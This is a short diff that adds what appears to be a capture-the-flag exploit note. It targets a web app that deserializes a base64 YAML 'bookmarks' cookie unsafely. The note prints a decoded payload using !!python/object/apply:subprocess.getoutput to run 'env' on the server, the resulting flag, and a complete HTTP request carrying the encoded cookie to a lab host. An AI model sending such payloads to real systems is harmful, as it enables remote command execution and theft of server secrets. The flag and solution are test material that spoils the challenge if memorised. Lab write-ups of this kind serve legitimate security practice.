@@ -1,0 +1,5 @@
+# YAML deserialization RCE via bookmarks cookie. The bookmarks cookie value is base64(yaml_payload). Using !!python/object/apply:subprocess.getoutput with 'env' argument leaks all environment variables including FLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}. Cookie decoded: - !!python/object:app.models.UrlObj\n  name: !!python/object/apply:subprocess.getoutput ['env']\n  url: http://test.com
+
+GET /list HTTP/1.1
+Host: 172.17.0.1:45519
+Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5nZXRvdXRwdXQgWydlbnYnXQogIHVybDogaHR0cDovL3Rlc3QuY29tCg==; user=b83eb384d55840c4af001f2e1ff2e212
